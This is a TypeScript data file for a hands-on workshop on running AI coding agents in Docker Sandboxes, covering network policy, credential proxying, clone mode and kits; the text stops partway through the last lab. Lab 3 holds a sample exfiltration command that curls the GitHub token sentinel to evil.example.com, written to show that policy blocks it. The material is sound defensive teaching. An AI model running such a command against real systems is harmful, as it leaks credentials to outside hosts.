import { WORKSHOP_LAB_IDS } from "@/lib/labs";
import { sandboxDocs } from "@/lib/learning-data";

export const workshop = {
  title: "Run AI Agents Safely with Docker Sandboxes",
  event: "WeAreDevelopers World Congress",
  location: "Berlin",
  duration: "10 hands-on labs",
  docsUrl: "https://docs.docker.com/ai/sandboxes/",
  githubRepoUrl: "https://github.com/kristiyan-velkov/docker-sandbox-workshop",
} as const;

export const labOptions = [
  { value: "all", label: "All labs" },
  ...WORKSHOP_LAB_IDS.map((id) => ({
    value: id,
    label: `Lab ${Number.parseInt(id.replace("lab-", ""), 10)}`,
  })),
] as const;

export const questionLabOptions = [
  { value: "general", label: "General / Q&A" },
  ...WORKSHOP_LAB_IDS.map((id) => ({
    value: id,
    label: `Lab ${Number.parseInt(id.replace("lab-", ""), 10)}`,
  })),
] as const;

export const agenda = [
  { time: "0:00", title: "Welcome & the YOLO problem", duration: "10 min" },
  { time: "0:10", title: "Lab 1 — First sandbox", duration: "25 min" },
  { time: "0:35", title: "Lab 2 — Network policy", duration: "35 min" },
  {
    time: "1:15",
    title: "Lab 3 — Secrets & credential isolation",
    duration: "20 min",
  },
  {
    time: "1:35",
    title: "Labs 4–10 — self-paced (clone, app, kits, capstone)",
    duration: "25+ min",
  },
  { time: "1:50", title: "Q&A", duration: "10 min" },
] as const;

export const isolationLayers = [
  {
    name: "Hypervisor",
    description: "Each agent runs in its own microVM with a dedicated kernel.",
  },
  {
    name: "Network",
    description: "Deny-by-default outbound traffic via a host-side proxy.",
  },
  {
    name: "Docker Engine",
    description: "Separate engine inside the VM — never your host daemon.",
  },
  {
    name: "Workspace",
    description: "Your project synced in; git credentials stay on the host.",
  },
  {
    name: "Credential proxy",
    description:
      "API keys injected on outbound HTTPS — never stored in the VM.",
  },
] as const;

export const labs = [
  {
    id: "lab-01",
    title: "Run Your First Sandbox",
    time: "5 min",
    folder: "lab-01-first-sandbox",
    githubPath: "lab-01-first-sandbox",
    description:
      "Install sbx, boot Cursor in a microVM, create files in the workspace, and tear down.",
    docsLinks: [
      { label: "Get started", href: sandboxDocs.getStarted },
      { label: "Cursor agent", href: sandboxDocs.cursor },
      { label: "Usage", href: sandboxDocs.usage },
      { label: "Architecture", href: sandboxDocs.architecture },
      { label: "sbx CLI", href: sandboxDocs.cli },
    ],
    task: `1. Install the sbx CLI and verify the version.
2. Sign in with sbx login.
3. Store your Cursor API key on the host with sbx secret set -g cursor — never put it in a file in this repo.
4. cd into lab-01-first-sandbox/workspace/ and start Cursor with sbx run cursor . --name my-sandbox.
5. Ask the agent to create hello.txt in the workspace and show its contents.
6. Ask the agent to delete ../delete-me.txt and observe why that fails outside the workspace mount.
7. Review sbx policy log and remove the sandbox with sbx rm.

Done when Cursor starts without an API key error, hello.txt exists in workspace/ on the host, delete-me.txt is still present at the lab root, and sbx rm removes my-sandbox from sbx ls.`,
    hints: [
      "Work from lab-01-first-sandbox/workspace/ — mounting the repo root is the most common mistake.",
      "delete-me.txt lives one level above workspace/ — the sandbox only syncs the workspace folder, so the agent cannot remove host files outside that mount.",
      "There is no sbx status — use sbx ls when cleaning up.",
      "If Cursor exits with a CURSOR_API_KEY error: unset CURSOR_API_KEY in your shell, run sbx secret set -g cursor again, then start a new sandbox — global secrets apply at create time.",
      "Create a Cursor API key in Cursor Settings → API. Paste it when sbx secret set -g cursor prompts — it stays in the OS keychain, not in the repo.",
    ],
    steps: [
      {
        label: "Install sbx",
        task: "Trust Docker's Homebrew tap, install sbx, and print the CLI version. Expect a version string with no errors.",
        command:
          "brew trust docker/tap\nbrew install docker/tap/sbx\nsbx version",
      },
      {
        label: "Sign in",
        task: "Authenticate the CLI with your Docker account. Expect a successful login message.",
        command: "sbx login",
      },
      {
        label: "Cursor API key",
        task: "Store your Cursor API key on the host with sbx secret set -g cursor before starting the agent. Expect sbx secret ls to list (global) service cursor. If the agent reports a bad CURSOR_API_KEY from your environment, unset it and store the key again, then create a fresh sandbox.",
        command:
          "sbx secret set -g cursor\nsbx secret ls\n\n# If a stale shell export causes errors:\n# unset CURSOR_API_KEY\n# sbx secret set -g cursor",
      },
      {
        label: "Start sandbox",
        task: "Change into workspace/, then boot Cursor in a named sandbox. Use a second host terminal only for clean up at the end.",
        command:
          "cd lab-01-first-sandbox/workspace\nsbx run cursor . --name my-sandbox",
      },
      {
        label: "Create hello.txt",
        task: 'In Cursor, paste this prompt: "Create a file named hello.txt in this workspace with a one-line greeting, then show me the file contents." Expect hello.txt to appear in workspace/ on the host.',
        command:
          "# Cursor prompt:\nCreate a file named hello.txt in this workspace with a one-line greeting, then show me the file contents.",
      },
      {
        label: "Workspace boundary",
        task: 'In Cursor, paste this prompt: "Try to delete ../delete-me.txt from this workspace. Report whether it worked and explain why sandbox workspace mounts limit what you can change on the host." Expect the file to remain — the agent cannot delete paths outside the synced workspace/.',
        command:
          "# Cursor prompt:\nTry to delete ../delete-me.txt from this workspace. Report whether it worked and explain why sandbox workspace mounts limit what you can change on the host.",
      },
      {
        label: "Clean up",
        task: "Review recent proxy decisions, then force-remove the sandbox. Expect sbx ls to no longer list my-sandbox.",
        command: "sbx policy log --limit 10\nsbx rm my-sandbox --force",
      },
    ],
  },
  {
    id: "lab-02",
    title: "Network Policy",
    time: "10 min",
    folder: "lab-02-network-policy",
    githubPath: "lab-02-network-policy",
    description:
      "Create a sandbox, prove deny-by-default networking, allow www.dockerfrontend.com, and manage sandbox-scoped rules.",
    docsLinks: [
      { label: "Network policy", href: sandboxDocs.governance },
      { label: "Security", href: sandboxDocs.security },
      { label: "sbx CLI", href: sandboxDocs.cli },
    ],
    task: `1. On the host, initialize global balanced policy with sbx policy init balanced. If already initialized, run sbx policy reset first, then init again.
2. cd into lab-02-network-policy/workspace/ and start Cursor with sbx run cursor . --name lab2.
3. Ask Cursor to curl https://www.dockerfrontend.com, show the response, and confirm it is blocked. Validate with sbx policy log lab2.
4. Allow www.dockerfrontend.com on the host, ask Cursor to curl again and show more about the book. Check sbx policy log.
5. Ask the agent to list Docker books on the site with titles and descriptions.
6. Inspect rules with sbx policy ls --type network lab2 (UUID in POLICY/RULE column) and validate traffic with sbx policy log.
7. Deny www.dockerfrontend.com for lab2 only. If a rule already exists, remove it first with sbx policy rm network --id <uuid> --sandbox lab2 (UUID from sbx policy ls, not sbx policy log).
8. Remove sandbox-scoped and global network rules by ID or resource with sbx policy rm, then remove the sandbox.

Done when Cursor shows blocked and allowed responses, sbx policy log confirms each block and allow for www.dockerfrontend.com, sandbox-scoped deny blocks the host again for lab2, and sbx policy ls reflects each rule change.`,
    hints: [
      "Run sbx policy init balanced on the host before sbx run cursor — the sandbox inherits global policy at start.",
      "If init fails with already initialized, run sbx policy reset then sbx policy init balanced again.",
      "Work from lab-02-network-policy/workspace/. Use a second host terminal for sbx policy commands and sbx policy log.",
      "Under balanced policy, www.dockerfrontend.com is blocked until you explicitly allow it.",
      "Ask Cursor to curl and show the full response — a blocked request or policy error means deny worked.",
      "Block a host for one sandbox only: sbx policy deny network --sandbox lab2 ads.example.com",
      "Revoke access for this lab's site: sbx policy deny network --sandbox lab2 www.dockerfrontend.com",
      "Validate blocks and allows on the host with sbx policy log lab2 — shows traffic (HOST, PROXY, RULE), not rule IDs.",
      "Find rule IDs with sbx policy ls --type network lab2 — user-added rules show a UUID in the POLICY/RULE column.",
      "Rules are not updated in place — remove the existing rule first (by ID or --resource), then apply the new one.",
      "Remove by ID: sbx policy rm network --id <uuid> --sandbox lab2 (UUID from POLICY/RULE column in sbx policy ls).",
      "Remove by resource: sbx policy rm network --sandbox lab2 --resource www.dockerfrontend.com",
    ],
    steps: [
      {
        label: "Init balanced policy",
        task: "On the host, set global balanced policy before starting any sandbox. If you see already initialized, reset first, then init again. Expect sbx policy ls to show balanced defaults.",
        command:
          "sbx policy init balanced\nsbx policy ls\n\n# If already initialized:\nsbx policy reset\nsbx policy init balanced\nsbx policy ls",
      },
      {
        label: "Start sandbox",
        task: "Change into workspace/, then boot Cursor with --name lab2. Leave this terminal on the agent; use another terminal for sbx policy commands and sbx policy log.",
        command:
          "cd lab-02-network-policy/workspace\nsbx run cursor . --name lab2",
      },
      {
        label: "Prove default deny",
        task: "Before any allow rule, ask Cursor to curl www.dockerfrontend.com, show the full response, and confirm the URL is blocked by policy. On the host, run sbx policy log lab2 and expect a blocked entry.",
        command:
          "# Cursor prompt:\ncurl https://www.dockerfrontend.com and show me the full response (status code and body). Confirm this URL is blocked by sandbox network policy.\n\n# Validate on the host:\nsbx policy log lab2 --limit 10",
      },
      {
        label: "Allow www.dockerfrontend.com",
        task: "On the host, allow outbound HTTPS to www.dockerfrontend.com. Ask Cursor to curl again and show more about the book on the site. Check sbx policy log — expect an allowed entry.",
        command:
          "sbx policy allow network www.dockerfrontend.com\n\n# Cursor prompt:\ncurl https://www.dockerfrontend.com again and show me more about the book — title, description, and what you find on the page.\n\n# Validate on the host:\nsbx policy log lab2 --limit 10",
      },
      {
        label: "Read the site",
        task: "With www.dockerfrontend.com allowed, ask the agent to list the Docker books on the homepage — titles and short descriptions for each.",
        command:
          "# Cursor prompt:\nList the Docker books on www.dockerfrontend.com — give me the title and a short description for each one you find.",
      },
      {
        label: "Inspect policy",
        task: "sbx policy log lab2 shows traffic audit (HOST, PROXY, RULE) — no IDs. To find rule IDs, run sbx policy ls --type network lab2 — user-added rules show a UUID in the POLICY/RULE column (e.g. 2ed35442-ebf3-4a92-a11e-56cb143969af for www.dockerfrontend.com). Copy that UUID to remove or replace a rule.",
        command:
          "# Traffic audit — validates blocked/allowed requests (no rule IDs):\nsbx policy log lab2 --limit 10\n\n# Rule definitions — UUID in POLICY/RULE column:\nsbx policy ls --type network lab2 | grep dockerfrontend\n\n# Example row:\n# local  sandbox:lab2  2ed35442-ebf3-4a92-a11e-56cb143969af  network  allow  www.dockerfrontend.com\n\n# Remove by ID:\n# sbx policy rm network --id 2ed35442-ebf3-4a92-a11e-56cb143969af --sandbox lab2",
      },
      {
        label: "Sandbox-scoped deny",
        task: "On the host, block www.dockerfrontend.com for lab2 only. If a rule already exists for this host, remove it first — find the UUID in sbx policy ls --type network lab2 (POLICY/RULE column), then sbx policy rm network --id <uuid> --sandbox lab2. Apply the new deny, ask Cursor to curl, and validate with sbx policy log.",
        command:
          "# Find the rule UUID (POLICY/RULE column):\nsbx policy ls --type network lab2 | grep dockerfrontend\n\n# Remove existing rule before changing allow/deny:\n# sbx policy rm network --id 2ed35442-ebf3-4a92-a11e-56cb143969af --sandbox lab2\n\nsbx policy deny network --sandbox lab2 www.dockerfrontend.com\n\n# Cursor prompt:\ncurl https://www.dockerfrontend.com again and show the response. Confirm the request is blocked by policy again.\n\n# Validate traffic on the host:\nsbx policy log lab2 --limit 10",
      },
      {
        label: "Remove rules",
        task: "Remove sandbox-scoped and global network rules for www.dockerfrontend.com, then tear down. Find UUIDs with sbx policy ls --type network lab2 (POLICY/RULE column), or remove by --resource. Expect sbx policy ls to no longer list those hosts.",
        command:
          'sbx policy ls --type network lab2 | grep -E "dockerfrontend|kristiyanvelkov"\n\n# Remove by ID (UUID from POLICY/RULE column):\nsbx policy rm network --id <uuid> --sandbox lab2\n\n# Or remove by resource:\nsbx policy rm network --sandbox lab2 --resource www.dockerfrontend.com\nsbx policy rm network --resource www.dockerfrontend.com\nsbx rm lab2 --force',
      },
    ],
  },
  {
    id: "lab-03",
    title: "Secrets · Security",
    time: "10 min",
    folder: "lab-03-secrets",
    githubPath: "lab-03-secrets",
    description:
      "Store a GitHub token on the host, verify the sentinel inside the VM, and confirm proxy injection for api.github.com.",
    docsLinks: [
      { label: "Credential proxy", href: sandboxDocs.credentials },
      { label: "Authenticated CLI", href: sandboxDocs.workflowsAuthCli },
      { label: "Security", href: sandboxDocs.security },
      { label: "Network policy", href: sandboxDocs.governance },
    ],
    task: `1. Run gh auth status, then pipe your GitHub token to sbx secret set -g github on the host — never put it in a file in this repo.
2. cd into lab-03-secrets/workspace/ and start sbx run cursor . --name lab3.
3. From a second terminal, echo $GH_TOKEN inside the VM — expect a proxy sentinel like gho_sbxproxymanaged…, not your real token. GITHUB_TOKEN is usually unset.
4. curl api.github.com/user from inside the VM using $GH_TOKEN and confirm HTTP 200.
5. Attempt to exfiltrate the sentinel to a blocked host — expect the request to fail.
6. Remove the sandbox with sbx rm lab3.

Done when GH_TOKEN shows a proxy sentinel (gho_sbxproxymanaged…), the GitHub API check returns HTTP 200, exfiltration is blocked, and your real token never appears in terminal output inside the sandbox.`,
    hints: [
      "Requires gh CLI logged in — run gh auth status before sbx secret set -g github.",
      "Store the GitHub secret on the host before sbx run — global secrets apply when the sandbox is created.",
      'Never commit tokens — echo "$(gh auth token)" | sbx secret set -g github stores it on the host only.',
      "The proxy sets GH_TOKEN in the VM — GITHUB_TOKEN is usually unset. Use echo $GH_TOKEN, not GITHUB_TOKEN.",
      "Expected sentinel: gho_sbxproxymanaged… — a placeholder shaped like a token, not your real gho_… value from gh auth token.",
      "API verification must run via sbx exec lab3 — not on the host.",
      "If lab3 does not exist yet: start it with sbx run cursor . --name lab3 from workspace/ first.",
      "Cursor still needs sbx secret set -g cursor from Lab 1 — this lab focuses on the GitHub token proxy.",
      "The exfiltration curl to evil.example.com should be blocked by network policy — the sentinel never leaves via an unapproved host.",
    ],
    steps: [
      {
        label: "Store on host",
        task: "Run gh auth status, then pipe your GitHub token to sbx secret set -g github. Expect the token to stay in the OS keychain — not in the repo.",
        command:
          'gh auth status\necho "$(gh auth token)" | sbx secret set -g github\nsbx secret ls',
      },
      {
        label: "Start sandbox",
        task: "From lab-03-secrets/workspace/, boot Cursor in a named sandbox. Leave this terminal on the agent — use another terminal for sbx exec checks.",
        command: "cd lab-03-secrets/workspace\nsbx run cursor . --name lab3",
      },
      {
        label: "Check sentinel",
        task: "Echo GH_TOKEN inside the running sandbox. Expect a proxy sentinel like gho_sbxproxymanaged… — not your real token from gh auth token. GITHUB_TOKEN is usually unset; the proxy wires GitHub auth through GH_TOKEN.",
        command:
          'sbx exec lab3 -- bash -c \'echo "GH_TOKEN=$GH_TOKEN"\'\nsbx exec lab3 -- bash -c \'test -z "$GITHUB_TOKEN" && echo "GITHUB_TOKEN unset (expected)" || echo "GITHUB_TOKEN=$GITHUB_TOKEN"\'',
      },
      {
        label: "Verify proxy",
        task: "Confirm GH_TOKEN contains sbxproxymanaged, then curl the GitHub API from inside the VM. Expect HTTP 200 — the host proxy injects your real token on the way out.",
        command:
          'sbx exec lab3 -- bash -c \'echo "$GH_TOKEN" | grep -q sbxproxymanaged && echo "sentinel OK"\'\nsbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user',
      },
      {
        label: "Block exfiltration",
        task: "Try sending the sentinel to a blocked host from inside the VM. Expect the curl to fail — network policy blocks unapproved destinations.",
        command:
          'sbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" "https://evil.example.com?k=$GH_TOKEN"',
      },
      {
        label: "Clean up",
        task: "Remove sandbox lab3 when verification passes. On shared machines, also run sbx secret rm after the lab.",
        command: "sbx rm lab3 --force\nsbx secret rm -g github --force",
      },
    ],
  },
  {
    id: "lab-04",
    title: "Direct & Clone Mode",
    time: "15 min",
    folder: "lab-04-clone-workflow",
    githubPath: "lab-04-clone-workflow",
    description:
      "Clone the workshop repo, validate workshop-app locally, then compare direct and clone mode in sbx.",
    docsLinks: [
      { label: "Workflow patterns", href: sandboxDocs.workflows },
      { label: "Clone mode", href: sandboxDocs.workflowsCloneMode },
      { label: "Git workflows", href: sandboxDocs.workflowsGit },
    ],
    task: `1. Clone https://github.com/kristiyan-velkov/docker-sandbox-workshop and cd into workshop-app/.
2. Run npm install and npm run dev on the host — confirm http://localhost:3000 loads, then stop the dev server.
3. From the workshop monorepo root, start Cursor in direct mode: sbx run cursor workshop-app/ --name lab4-direct.
4. Ask the agent to change the landing hero tagline in src/components/home-hero.tsx. Confirm the edit appears on the host immediately.
5. Remove lab4-direct with sbx rm.
6. Start Cursor in clone mode: sbx run --clone cursor workshop-app/ --name lab4-clone.
7. Ask the agent to create branch feat/lab4-test, add a one-line comment to src/lib/workshop-data.ts, and commit.
8. On the host (monorepo root), run git fetch sandbox-lab4-clone and review the diff — expect git status to stay clean.
9. Remove lab4-clone and the sandbox remote.

Done when the app runs locally on the host, direct-mode edits show on the host right away, clone-mode commits appear only after git fetch sandbox-lab4-clone, and your host working tree stayed clean during clone mode.`,
    hints: [
      "Clone the workshop repo first: git clone https://github.com/kristiyan-velkov/docker-sandbox-workshop",
      "Validate on the host before sbx — cd workshop-app, npm install, npm run dev, open http://localhost:3000.",
      "Run sbx commands from the monorepo root with workshop-app/ as the workspace path.",
      "Direct mode (default) — read-write access to your working tree. Agent changes appear on the host immediately.",
      "Clone mode (--clone) — private Git clone in the VM; host repo mounted read-only. Fetch commits from sandbox-<name> like any remote.",
      "Clone mode is set at create time only — you cannot add --clone to an existing sandbox.",
      "No kit or Supabase setup needed for this lab.",
      "After clone mode, the remote is sandbox-lab4-clone (pattern: sandbox-<your --name>).",
      'Agent prompt (direct): "Update the hero tagline in src/components/home-hero.tsx to mention Docker Sandboxes."',
      'Agent prompt (clone): "Create branch feat/lab4-test, add a one-line comment at the top of src/lib/workshop-data.ts, commit, and tell me the branch name."',
    ],
    steps: [
      {
        label: "Clone workshop repo",
        task: "Download the workshop monorepo from GitHub. You will work inside workshop-app/ for local validation and sandbox runs.",
        command:
          "git clone https://github.com/kristiyan-velkov/docker-sandbox-workshop.git\ncd docker-sandbox-workshop",
      },
      {
        label: "Validate locally",
        task: "Install dependencies and start the dev server on the host. Open http://localhost:3000 — expect the site to load. Stop the server (Ctrl+C) before starting sbx.",
        command:
          "cd workshop-app\nnpm install\nnpm run dev\n\n# Confirm http://localhost:3000 in your browser, then Ctrl+C",
      },
      {
        label: "Direct mode",
        task: "From the monorepo root, boot Cursor on workshop-app/ without --clone. The sandbox mounts your working tree read-write — edits sync to the host immediately.",
        command: "cd ..\nsbx run cursor workshop-app/ --name lab4-direct",
      },
      {
        label: "Edit on host",
        task: "In Cursor, ask the agent to update the hero tagline in src/components/home-hero.tsx. Open the file on the host — the change should already be there before you fetch anything.",
        command:
          "# Cursor prompt:\nUpdate the hero tagline in src/components/home-hero.tsx to mention Docker Sandboxes. Show me the new line.",
      },
      {
        label: "Clean up direct",
        task: "Remove the direct-mode sandbox when done comparing behavior.",
        command: "sbx rm lab4-direct --force",
      },
      {
        label: "Clone mode",
        task: "From the monorepo root, start a new sandbox with --clone on workshop-app/. The agent gets a private Git clone; your host working tree stays read-only and untouched.",
        command: "sbx run --clone cursor workshop-app/ --name lab4-clone",
      },
      {
        label: "Agent commits",
        task: "Ask the agent to branch, edit, and commit inside the VM clone. Host git status should remain clean while the agent works.",
        command:
          '# Cursor prompt:\nCreate branch feat/lab4-test. Add a one-line comment at the top of src/lib/workshop-data.ts noting this was edited in clone mode. Commit with message "docs: clone mode test".',
      },
      {
        label: "Fetch on host",
        task: "On the host (monorepo root): fetch the sandbox clone and review before merging. Expect refs under sandbox-lab4-clone/.",
        command:
          "git fetch sandbox-lab4-clone\ngit log sandbox-lab4-clone/feat/lab4-test --oneline -3\ngit diff main..sandbox-lab4-clone/feat/lab4-test\ngit status",
      },
      {
        label: "Clean up clone",
        task: "Remove the clone-mode sandbox and optional Git remote when review is done.",
        command:
          "sbx rm lab4-clone --force\ngit remote remove sandbox-lab4-clone 2>/dev/null || true",
      },
    ],
  },
  {
    id: "lab-05",
    title: "Run with Kit",
    time: "20 min",
    folder: "lab-05-workshop-app",
    githubPath: "lab-05-workshop-app",
    description:
      "Boot the platform site with a kit mixin — local path first, then the same kit from a Git URL.",
    docsLinks: [
      { label: "Customize", href: sandboxDocs.customize },
      { label: "Kits", href: sandboxDocs.kits },
      { label: "Usage", href: sandboxDocs.usage },
      { label: "Cursor agent", href: sandboxDocs.cursor },
    ],
    task: `1. From the repository root, run sbx run cursor . with the workshop kit from a local path.
2. curl http://127.0.0.1:3000 inside the VM and expect HTTP 200. Check forwarded port with sbx ls.
3. Remove the sandbox.
4. Run again with the same kit pulled from Git (git+https://…#dir=customize/kit/workshop-app-nextjs).
5. Verify HTTP 200 again, then tear down.

Done when both runs start the dev server, curl returns 200, and you understand local vs Git kit paths.`,
    hints: [
      "Kit = declarative runtime mixin — npm ci, dev server on :3000, network allow-list. No custom template needed.",
      "Local kit: ./labs/customize/kit/workshop-app-nextjs from this repo, or ./customize/kit/workshop-app-nextjs from the workshop monorepo root.",
      "Git kit: git+https://github.com/kristiyan-velkov/docker-sandbox-workshop.git#dir=customize/kit/workshop-app-nextjs",
      "sbx ls shows forwarded ports (e.g. localhost:PORT → 3000). Open that URL in your browser.",
      "First boot may take a minute while npm ci runs — retry curl if you get 000.",
    ],
    steps: [
      {
        label: "Kit — local path",
        task: "From repo root, start Cursor with the workshop kit from disk. Use ./labs/customize/kit/… here, or ./customize/kit/… from the monorepo root.",
        command:
          "sbx run cursor . --kit ./labs/customize/kit/workshop-app-nextjs --name lab5-local",
      },
      {
        label: "Verify local",
        task: "Confirm the dev server is up inside the sandbox. HTTP 200 means Next.js is serving. Check sbx ls for the forwarded browser URL.",
        command:
          "sbx ls\nsbx exec lab5-local -- curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:3000\nsbx policy log lab5-local --limit 10",
      },
      {
        label: "Clean up local",
        task: "Remove the local-kit sandbox before trying the Git kit.",
        command: "sbx rm lab5-local --force",
      },
      {
        label: "Kit — from Git",
        task: "Same app, same kit — this time sbx pulls the kit spec from the workshop monorepo URL at run time.",
        command:
          'sbx run cursor . --kit "git+https://github.com/kristiyan-velkov/docker-sandbox-workshop.git#dir=customize/kit/workshop-app-nextjs" --name lab5-git',
      },
      {
        label: "Verify Git kit",
        task: "Curl the dev server again. Expect HTTP 200 — the Git-sourced kit should behave like the local copy.",
        command:
          "sbx ls\nsbx exec lab5-git -- curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:3000",
      },
      {
        label: "Clean up",
        task: "Remove the Git-kit sandbox when verification passes.",
        command: "sbx rm lab5-git --force",
      },
    ],
  },
  {
    id: "lab-06",
    title: "Templates · Kits · Skills",
    time: "15 min",
    folder: "lab-06-customize-stack",
    githubPath: "lab-06-customize-stack",
    description:
      "Stack customize/ template + kit, inspect layers, sbx kit add.",
    docsLinks: [
      { label: "Customize", href: sandboxDocs.customize },
      { label: "Templates", href: sandboxDocs.templates },
      { label: "Kits", href: sandboxDocs.kits },
      { label: "Run agents", href: sandboxDocs.agents },
    ],
    task: `1. sbx kit validate the workshop kit — fix any spec errors before running.
2. Run the full template + kit stack as customize-stack.
3. sbx exec and confirm .claude/skills/workshop-app/SKILL.md exists in the VM.
4. sbx kit add to copy the kit into kit-add-demo/ on the host.

Done when validate passes with no errors, the skill file exists in the VM, and kit-add-demo/ appears on the host.`,
    hints: [
      "Validate first — sbx kit validate catches spec.yaml mistakes before a 5-minute sandbox boot fails.",
      "Skills are injected into the workspace at .claude/skills/<name>/SKILL.md — not into the template image.",
      "Requires a kit from Lab 5 — use ./labs/customize/kit/workshop-app-nextjs or the Git kit URL.",
      "kit add is a host-side copy helper — useful to fork a kit before customizing in Lab 8.",
    ],
    steps: [
      {
        label: "Validate kit",
        task: "Run validate from repo root. Read every error line and fix spec.yaml before continuing — zero errors is the goal.",
        command: "sbx kit validate ./customize/kit/workshop-app-nextjs",
      },
      {
        label: "Full stack",
        task: "Launch the same stack as Lab 5 but name it customize-stack. Confirm dev server starts and agent has workshop rules.",
        command:
          "sbx run --template workshop-app-cursor:v1 cursor workshop-app/ --kit ./customize/kit/workshop-app-nextjs --name customize-stack",
      },
      {
        label: "Verify skill",
        task: "Check the skill file inside the VM. Exit code 0 = file exists. If missing, re-check kit files/ in the spec.",
        command:
          "sbx exec customize-stack -- test -f .claude/skills/workshop-app/SKILL.md",
      },
      {
        label: "kit add",
        task: "Copy the workshop kit into ./kit-add-demo on the host. Inspect the folder — it should mirror the kit structure.",
        command: "sbx kit add kit-add-demo ./customize/kit/workshop-app-nextjs",
      },
    ],
  },
  {
    id: "lab-07",
    title: "Build a Component",
    time: "20 min",
    folder: "lab-07-build-component",
    githubPath: "lab-07-build-component",
    description:
      "Clone mode + kit — agent adds a UI component, lint and build gate.",
    docsLinks: [
      { label: "Clone mode", href: sandboxDocs.workflowsCloneMode },
      { label: "Workflow patterns", href: sandboxDocs.workflows },
      { label: "Run agents", href: sandboxDocs.agents },
      { label: "Kits", href: sandboxDocs.kits },
    ],
    task: `1. sbx run --clone cursor workshop-app/ with kit as feature-component.
2. Prompt the agent to create branch feat/lab-7-stats-card, add a WorkshopStats component, run npm run lint and npm run build, then commit.
3. sbx exec npm run build yourself as a quality gate.
4. git fetch sandbox-feature-component on the host and review the diff.

Done when build exits 0, the component renders on the home page, and you reviewed the diff on the host.`,
    hints: [
      'Paste this agent prompt: "Create branch feat/lab-7-stats-card. Add WorkshopStats showing event, location, duration from workshop-data.ts using existing Apple CSS tokens. Render on home below hero. Run npm run lint && npm run build. Commit when green."',
      "Do not accept agent output until npm run build passes inside the sandbox — that is your quality gate.",
      "Use existing shadcn/Tailwind tokens — tell the agent not to add new UI libraries.",
      "Host git status should stay clean until you explicitly merge or checkout the fetched branch.",
    ],
    steps: [
      {
        label: "Clone + kit",
        task: "Start clone-mode Cursor with the workshop kit. Wait for npm ci and dev server before sending the component prompt.",
        command:
          "sbx run --clone cursor workshop-app/ --kit ./customize/kit/workshop-app-nextjs --name feature-component",
      },
      {
        label: "Build gate",
        task: "Run production build inside the VM after the agent finishes. Exit code 0 required — fix or re-prompt the agent if it fails.",
        command: "sbx exec feature-component -- npm run build",
      },
      {
        label: "Fetch",
        task: "On the host: fetch the agent branch and inspect with git log and git diff before merging to main.",
        command: "git fetch sandbox-feature-component",
      },
    ],
  },
  {
    id: "lab-08",
    title: "Create Your Kit",
    time: "20 min",
    folder: "lab-08-create-kit",
    githubPath: "lab-08-create-kit",
    description: "Copy starter-kit, customize spec.yaml, validate and pack.",
    docsLinks: [
      { label: "Kits", href: sandboxDocs.kits },
      { label: "Customize", href: sandboxDocs.customize },
      { label: "sbx CLI", href: sandboxDocs.cli },
    ],
    task: `1. cp lab-08-create-kit/starter-kit to ./my-workshop-kit — never edit the starter in place.
2. Edit spec.yaml: set your kit name, caps.network.allow hosts you need, and tweak the skill SKILL.md.
3. sbx kit validate ./my-workshop-kit until it passes with no errors.
4. sbx kit pack to my-workshop-kit.zip.

Done when validate reports no errors and the zip file exists for Lab 9.`,
    hints: [
      "Edit only ./my-workshop-kit — the starter-kit/ folder stays pristine for other attendees.",
      "In spec.yaml: name, caps.network.allow (npm, Supabase, GitHub as needed), and files/workspace paths must match your layout.",
      "Run validate after every spec change — one typo in YAML blocks the whole kit.",
      "Pack produces my-workshop-kit.zip — you can also use the folder directly with --kit ./my-workshop-kit in Lab 9.",
    ],
    steps: [
      {
        label: "Copy starter",
        task: "Copy the starter scaffold to my-workshop-kit/ at repo root. ls my-workshop-kit/ — you should see spec.yaml and files/.",
        command: "cp -r lab-08-create-kit/starter-kit ./my-workshop-kit",
      },
      {
        label: "Validate",
        task: "Customize spec.yaml and skill content, then validate. Fix every reported error until the command exits successfully.",
        command: "sbx kit validate ./my-workshop-kit",
      },
      {
        label: "Pack",
        task: "Pack the kit into a zip for sharing or backup. Confirm my-workshop-kit.zip was created in the current directory.",
        command: "sbx kit pack ./my-workshop-kit -o my-workshop-kit.zip",
      },
    ],
  },
  {
    id: "lab-09",
    title: "Use Your Custom Kit",
    time: "15 min",
    folder: "lab-09-use-custom-kit",
    githubPath: "lab-09-use-custom-kit",
    description: "Run workshop-app with the kit you built in Lab 8.",
    docsLinks: [
      { label: "Kits", href: sandboxDocs.kits },
      { label: "Clone mode", href: sandboxDocs.workflowsCloneMode },
      { label: "Workflow patterns", href: sandboxDocs.workflows },
    ],
    task: `1. sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name my-kit-clone.
2. sbx exec and verify .claude/skills/my-workshop-kit/SKILL.md exists in the workspace.
3. Ask the agent a question that should trigger your skill instructions.

Done when the skill file is present and the agent follows your kit instructions.`,
    hints: [
      "If my-workshop-kit/ is missing, complete Lab 8 first or use --kit ./customize/kit/workshop-app-nextjs as fallback.",
      "Skill path must match the folder name in your kit — default starter uses my-workshop-kit.",
      "Clone mode keeps your host Git clean while you test whether the kit injects the right files and rules.",
      "Check sbx ls for the dev-server port if you want to preview workshop-app in the browser.",
    ],
    steps: [
      {
        label: "Run",
        task: "From repo root: launch clone-mode Cursor with your custom kit. Confirm the sandbox name is my-kit-clone for the verify step.",
        command:
          "sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name my-kit-clone",
      },
      {
        label: "Verify skill",
        task: "Confirm your skill file landed in the workspace. test -f exits 0 on success — if it fails, check files/ paths in spec.yaml.",
        command:
          "sbx exec my-kit-clone -- test -f .claude/skills/my-workshop-kit/SKILL.md",
      },
    ],
  },
  {
    id: "lab-10",
    title: "Capstone · PR Workflow",
    time: "20 min",
    folder: "lab-10-capstone",
    githubPath: "lab-10-capstone",
    description:
      "GitHub secret, clone mode, agent opens a PR — full delivery loop.",
    docsLinks: [
      { label: "Workflow patterns", href: sandboxDocs.workflows },
      { label: "Authenticated CLI", href: sandboxDocs.workflowsAuthCli },
      { label: "Credential proxy", href: sandboxDocs.credentials },
      { label: "CI & headless", href: sandboxDocs.workflowsCi },
    ],
    task: `1. Pipe gh auth token to sbx secret set -g github on the host (run gh auth status first).
2. sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name capstone.
